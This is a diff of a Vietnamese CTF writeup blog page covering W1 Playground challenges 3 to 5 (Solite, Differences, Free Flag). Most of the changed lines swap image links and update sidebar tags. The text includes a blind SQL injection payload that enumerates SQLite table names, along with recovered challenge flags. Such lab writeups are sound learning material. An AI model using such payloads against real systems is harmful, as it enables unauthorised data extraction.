     <h2 id="bài-3-solite"><span class="me-2">Bài 3 Solite:</span><a href="#bài-3-solite" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/1b569475-6ce3-4a81-8a8c-ca37628b8e39" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/1b569475-6ce3-4a81-8a8c-ca37628b8e39" alt="image" loading="lazy"></a></p>
+    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/6fd2d2cb-901f-46f3-bdeb-c215efb0ef9a" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/6fd2d2cb-901f-46f3-bdeb-c215efb0ef9a" alt="image" loading="lazy"></a></p>
   </li>
   <li>Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được</li>
   <li>Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox)</li>
 </ul>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/138c6617-f120-42e6-bd3d-d0d908d661e7" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/138c6617-f120-42e6-bd3d-d0d908d661e7" alt="image" loading="lazy"></a></p>
+<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5c47c030-9790-44ae-a5a2-903a5904b768" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5c47c030-9790-44ae-a5a2-903a5904b768" alt="image" loading="lazy"></a></p>
 
 <ul>
   <li>Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection</li>
   <li>
     <p>Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter
-<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/8511cff7-b6c5-4094-862d-d109b62eef8f" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/8511cff7-b6c5-4094-862d-d109b62eef8f" alt="image" loading="lazy"></a></p>
+<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a4f8f195-8a8c-4a9f-9d70-1cbca22199ac" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a4f8f195-8a8c-4a9f-9d70-1cbca22199ac" alt="image" loading="lazy"></a></p>
   </li>
   <li>
     <p>Đây là query của bài
-<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2d617e44-62ac-43b9-9e24-7b9b73252799" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2d617e44-62ac-43b9-9e24-7b9b73252799" alt="image" loading="lazy"></a></p>
+<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/14d13c79-1151-46d3-9288-13b8647e2de8" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/14d13c79-1151-46d3-9288-13b8647e2de8" alt="image" loading="lazy"></a></p>
   </li>
   <li>Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng</li>
   <li><code class="language-plaintext highlighter-rouge">Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--</code></li>
@@ -1935,7 +1951,7 @@ thành
 </pre></td></tr></tbody></table></code></div></div>
 <ul>
   <li>Và tìm ra được tên của các bảng là
-<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/418d91e8-49ba-4f20-bde8-d7adc602926a" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/418d91e8-49ba-4f20-bde8-d7adc602926a" alt="image" loading="lazy"></a></li>
+<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/de22bd13-a94c-4b06-b556-bc7125006578" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/de22bd13-a94c-4b06-b556-bc7125006578" alt="image" loading="lazy"></a></li>
 </ul>
 
 <p><code class="language-plaintext highlighter-rouge">Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0</code></p>
@@ -1999,12 +2015,12 @@ thành
 <ul>
   <li>Flag: <strong>W1{I_th1nk_u_r_so_lite^_^}</strong>
     <h2 id="bài-4-differences"><span class="me-2">Bài 4 Differences:</span><a href="#bài-4-differences" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a7582df9-e22c-4883-8b36-1c471028aeeb" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a7582df9-e22c-4883-8b36-1c471028aeeb" alt="image" loading="lazy"></a></p>
+    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/741e394e-645f-4cb2-89b8-b9b3af8480c8" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/741e394e-645f-4cb2-89b8-b9b3af8480c8" alt="image" loading="lazy"></a></p>
   </li>
   <li>Flag ngay ở trong file</li>
   <li>Flag: <strong>W1{SaKur4_s0_b34uTiFuL_RI9ht?????}</strong>
     <h2 id="bài-5-free-flag"><span class="me-2">Bài 5 Free Flag:</span><a href="#bài-5-free-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/4bab7039-5cde-4132-bcd6-5b2a4ddb73e1" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/4bab7039-5cde-4132-bcd6-5b2a4ddb73e1" alt="image" loading="lazy"></a></p>
+    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5a6a78c9-2a29-4b8f-8bad-06ac8edf244d" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5a6a78c9-2a29-4b8f-8bad-06ac8edf244d" alt="image" loading="lazy"></a></p>
   </li>
   <li>Đọc file pcapng ta tìm được source và key</li>
 </ul>
@@ -2063,7 +2079,7 @@ thành
     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">&gt; Here is your encrypted secret:</span><span class="sh">"</span><span class="p">,</span> <span class="nf">encryptSecret</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a9b96523-9039-4b3c-abbb-4d87c0147612" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a9b96523-9039-4b3c-abbb-4d87c0147612" alt="image" loading="lazy"></a></p>
+<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/b9af05e2-79f2-40e9-ab06-2bbbacface9e" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/b9af05e2-79f2-40e9-ab06-2bbbacface9e" alt="image" loading="lazy"></a></p>
 
 <ul>
   <li>Decrypt lại ta sẽ có flag</li>
@@ -2235,14 +2251,21 @@ thành
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
+          <a href="/posts/Wannagame-Freshman/">Wannagame Freshman CTF writeup</a>
         </li>
       
         
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/Wannagame-Freshman/">Wannagame Freshman CTF writeup</a>
+          <a href="/posts/PicoCTF2024/">PicoCTF 2024</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
         </li>
       
         
@@ -2293,10 +2316,16 @@ thành
     
     
     
-      
-        
-        
-
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
   
     
     
@@ -2312,6 +2341,15 @@ thành
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2335,6 +2373,173 @@ thành
     
     
       
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
     
   
     
@@ -2358,10 +2563,22 @@ thành
         <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/prototype-pollution/">Prototype Pollution</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/sql-injectiom/">SQL Injectiom</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/symlink/">Symlink</a>
       
     </div>
   </section>
@@ -2412,6 +2629,18 @@ thành
 
 
 
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
   
 
@@ -2536,6 +2765,42 @@ Bài 1 hello:
           </a>
         </article>
       
+        <article class="col">
+          <a href="/posts/PicoCTF2024/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1711555200"
+  data-df="ll"
+  
+>
+  Mar 27, 2024
+</time>
+
+              <h4 class="pt-0 my-2">PicoCTF 2024</h4>
+              <div class="text-muted">
+                <p>
+                  
+
+
+
+
+
+                  PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ...
+                </p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
     </nav>
   </aside>
   <!-- #related-posts -->
@@ -2650,10 +2915,16 @@ Bài 1 hello:
     
     
     
-      
-        
-        
-
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
   
     
     
@@ -2669,6 +2940,15 @@ Bài 1 hello:
     
     
       
+        
+        
+
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2692,6 +2972,173 @@ Bài 1 hello:
     
     
       
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
     
   
     
@@ -2715,10 +3162,22 @@ Bài 1 hello:
         <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/prototype-pollution/">Prototype Pollution</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/sql-injectiom/">SQL Injectiom</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/symlink/">Symlink</a>
       
     </div>
   </section>
